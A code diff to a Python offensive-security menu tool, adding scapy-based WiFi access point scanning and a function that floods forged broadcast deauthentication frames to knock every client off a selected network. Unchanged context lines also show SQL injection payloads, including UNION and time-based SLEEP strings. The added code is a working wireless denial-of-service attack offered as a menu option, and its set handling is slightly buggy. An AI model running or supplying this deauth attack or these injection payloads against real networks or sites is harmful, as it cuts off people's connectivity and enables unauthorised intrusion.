@@ -7,6 +7,7 @@ import os
 import dns.resolver
 import dns.query
 import dns.zone
+from scapy.all import *
 from concurrent.futures import ThreadPoolExecutor
 
 os.makedirs("output", exist_ok=True)
@@ -40,13 +41,40 @@ def display_menu():
     print("\033[1;32m11.\033[1;m Open Redirect Testing")
     print("\033[1;32m12.\033[1;m Command Injection Testing")
     print("\033[1;32m13.\033[1;m CVE Exploit Checker")
-    print("\033[1;32m14.\033[1;m Exit")
-    choice = input("\033[1;32mEnter options (1-14): \033[1;m")
+    print("\033[1;32m14.\033[1;m Scan WiFi Access Points")
+    print("\033[1;32m15.\033[1;m Disconnect Clients from Access Point")
+    print("\033[1;32m16.\033[1;m Exit")
+    choice = input("\033[1;32mEnter options (1-16): \033[1;m")
     return choice
 
 def url_validator(url):
     parsed = urlparse(url)
     return parsed.scheme in ('http', 'https')
+
+def scan_access_points(interface):
+    ap_list = set()
+
+    def packet_handler(packet):
+        if packet.haslayer(Dot11Beacon):
+            ssid = packet[Dot11Elt].info.decode()
+            bssid = packet[Dot11].addr3
+            if bssid not in ap_list:
+                ap_list.add((ssid, bssid))
+                print(f"Found AP: SSID={ssid}, BSSID={bssid}")
+
+    print("Scanning for access points...")
+    sniff(iface=interface, prn=packet_handler, timeout=10)
+    return list(ap_list)
+
+def deauth_all_clients(ap_mac, interface="wlan0", count=100):
+    broadcast_mac = "FF:FF:FF:FF:FF:FF"
+    dot11 = Dot11(addr1=broadcast_mac, addr2=ap_mac, addr3=ap_mac)
+    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
+
+    print(f"Sending deauth packets to all clients on AP {ap_mac}...")
+    for _ in range(count):
+        sendp(packet, iface=interface, inter=0.1, verbose=False)
+    print("All clients should now be disconnected.")
 
 async def fetch_subdomains(domain):
     print("\nPress 'b' anytime to go back to the main menu.")
@@ -203,8 +231,6 @@ async def sql_injection_testing(url):
     "' OR EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))--",
     "' UNION SELECT 1, version(), 3--", "' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))abc)--"
     ]
-
-    
     async with aiohttp.ClientSession() as session:
         for payload in sql_payloads:
             test_url = f"{url}{payload}"
@@ -487,6 +513,21 @@ async def main():
             domain = input("Enter the domain for CVE exploit checking (e.g., example.com): ")
             await cve_exploit_checker(domain)
         elif choice == "14":
+            iface = input("Enter your monitor mode interface (e.g., wlan0mon): ")
+            ap_list = scan_access_points(iface)
+            print("\nAccess Points Found:")
+            for i, (ssid, bssid) in enumerate(ap_list, 1):
+                print(f"{i}. SSID: {ssid}, BSSID: {bssid}")
+        elif choice == "15":  # Menambah opsi deauth client
+            iface = input("Enter your monitor mode interface (e.g., wlan0mon): ")
+            ap_list = scan_access_points(iface)
+            print("\nAccess Points Found:")
+            for i, (ssid, bssid) in enumerate(ap_list, 1):
+                print(f"{i}. SSID: {ssid}, BSSID: {bssid}")
+            selected_index = int(input("Enter the number of the target AP to disconnect clients: ")) - 1
+            target_ap_mac = ap_list[selected_index][1]
+            deauth_all_clients(target_ap_mac, iface)
+        elif choice == "16":
             print("Exiting...")
             break
         else:
